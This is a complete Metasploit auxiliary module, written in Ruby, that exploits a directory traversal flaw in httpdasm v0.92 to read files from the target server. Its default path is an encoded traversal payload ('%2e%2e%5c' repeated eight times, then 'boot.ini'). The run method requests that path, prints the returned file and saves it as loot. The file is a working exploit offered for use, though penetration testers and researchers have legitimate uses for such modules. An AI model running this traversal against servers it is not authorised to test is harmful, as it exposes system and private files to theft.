##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Httpdasm Directory Traversal',
      'Description'    => %q{
        Exploits a directory traversal vulnerability to read files from server running httpdasm v0.92.
      },
      'Author'         =>
        [
          'John Leitch', # EDB POC
          'Shelby Pace' # Metasploit Module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '15861']
        ]
    ))

    register_options(
    [
      OptString.new('TARGETURI', [true, 'Default path', '%2e%2e%5c' * 8 + 'boot.ini'])
    ])

  end

  def run
    uri = target_uri.path
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri)
    })

    if res && res.code == 200
      print_status(res.body)
      path = store_loot('httpdasm.file', 'application/octet-stream', rhost, res.body)
    else
      print_error("Timeout")
    end
    end
end
